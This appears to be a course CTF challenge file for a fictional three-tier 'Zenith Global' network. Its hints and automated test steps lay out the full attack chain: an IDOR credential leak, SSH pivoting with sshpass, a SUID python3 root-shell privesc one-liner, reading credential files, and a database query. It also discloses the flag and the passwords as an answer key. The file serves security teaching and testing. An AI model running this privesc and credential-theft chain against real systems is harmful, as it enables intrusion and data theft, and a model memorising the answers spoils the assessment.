@@ -1,0 +1,147 @@
+name: "Zenith Global - Capstone CTF"
+description: "Conduct a full red team engagement against Zenith Global Corp. Chain web exploitation, privilege escalation, and lateral movement across three servers to achieve complete infrastructure compromise."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 120
+randomize_ip_offsets: true
+visibility: course
+week: 15
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/15_Capstone_CTF/"
+flag: "OCR{z3n1th_pwn3d_v1ct0ry}"
+
+objectives:
+  - Perform comprehensive reconnaissance across multiple target systems
+  - Exploit a web application vulnerability to gain initial access
+  - Escalate privileges on a compromised server
+  - Move laterally to additional internal systems using discovered credentials
+  - Extract data from a backend database to prove full compromise
+  - Capture the flag
+
+scenario: |
+  Zenith Global Corp is a multinational logistics company headquartered in
+  Chicago. They've engaged your elite red team for a full-scope penetration
+  test as part of their annual security program. This is the capstone
+  assessment - everything you've learned this semester comes together here.
+
+  Briefing from Diane Holloway (CISO): "We have three tiers of infrastructure.
+  The web frontend handles customer tracking and order management. Behind that,
+  our application server runs the business logic. And at the core, our database
+  server holds everything - customer data, financial records, shipping manifests.
+  I want you to demonstrate whether an external attacker can reach our data.
+  Our architecture team says it's impossible without insider access."
+
+  Prove them wrong. Three flags are planted across all three tiers. This is your
+  final exam - no hints for the first 30 minutes. Good luck.
+
+credentials: []
+
+hints:
+  - text: |
+      Start with the web frontend. Enumerate all services with nmap. The web
+      application has an API that serves order data. One API endpoint has an
+      IDOR (Insecure Direct Object Reference) vulnerability - it returns data
+      for any order ID without authorization. Interesting data might include
+      internal system credentials.
+    unlock_after_minutes: 30
+  - text: |
+      Try /api/orders/1 through /api/orders/10. Order #7 contains internal
+      notes with SSH credentials for the appserver. Marker 1 is in the web
+      frontend's config. SSH to the appserver as the discovered user. The
+      appserver has python3 with SUID - use it for privesc. Then find the
+      database credentials and query the datastore.
+    unlock_after_minutes: 50
+  - text: |
+      Frontend: curl http://<webfront>/api/orders/7 - gives SSH creds
+      Also: curl http://<webfront>/api/config (broken access) - marker 1
+      Appserver: ssh appuser@<appserver> with discovered password.
+      Privesc: python3 -c "import os;os.setuid(0);os.system('/bin/sh')"
+      Marker 2 in /root/marker.txt. DB creds in /opt/zenith/db.conf.
+      Datastore: mysql -h <datastore> -u zenith_app -p'...' zenith -e "SELECT * FROM flags"
+    unlock_after_minutes: 70
+
+topology:
+  nodes:
+    - id: "webfront"
+      label: "Web Frontend"
+      type: "server"
+      ip_offset: "10"
+      ports: [80]
+      services: ["Flask"]
+      x: 1
+      y: 1
+    - id: "appserver"
+      label: "App Server"
+      type: "server"
+      ip_offset: "24"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 3
+      y: 1
+    - id: "datastore"
+      label: "Database"
+      type: "database"
+      ip_offset: "42"
+      ports: [3306]
+      services: ["MySQL 8.0"]
+      x: 5
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webfront"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "appserver"
+      label: "SSH:22"
+      access: "direct"
+    - from: "attacker"
+      to: "datastore"
+      label: "MySQL:3306"
+      access: "direct"
+    - from: "webfront"
+      to: "appserver"
+      label: "Internal"
+      access: "internal"
+    - from: "appserver"
+      to: "datastore"
+      label: "MySQL:3306"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Web frontend responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webfront}/"
+      expect: "200"
+
+    - name: "IDOR on orders API reveals SSH credentials"
+      command: "curl -s http://{target.webfront}/api/orders/7 | grep -o 'Z3n1th_App_2024#'"
+      expect: "Z3n1th_App_2024#"
+
+    - name: "Extract marker 1 from web config endpoint"
+      command: "curl -s http://{target.webfront}/api/config | grep -o 'marker[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'"
+      expect: "z3n1th"
+
+    - name: "Pivot to appserver with discovered SSH credentials"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'whoami' 2>/dev/null"
+      expect: "appuser"
+      timeout: 15
+
+    - name: "Privesc via SUID python3 and read marker 2"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>/dev/null"
+      expect: "pwn3d"
+      timeout: 15
+
+    - name: "Extract DB credentials from appserver config"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>/dev/null | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"
+      expect: "Z3n_DB_Pr0d#"
+      timeout: 15
+
+    - name: "Query database for marker 3"
+      command: "mysql -h {target.datastore} -u zenith_app -p'Z3n_DB_Pr0d#' zenith -N -e 'SELECT value FROM flags WHERE name=\"assessment\"' 2>/dev/null"
+      expect: "v1ct0ry"
+      timeout: 20
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{z3n1th_pwn3d_v1ct0ry}'"
+      expect: "OCR{z3n1th_pwn3d_v1ct0ry}"
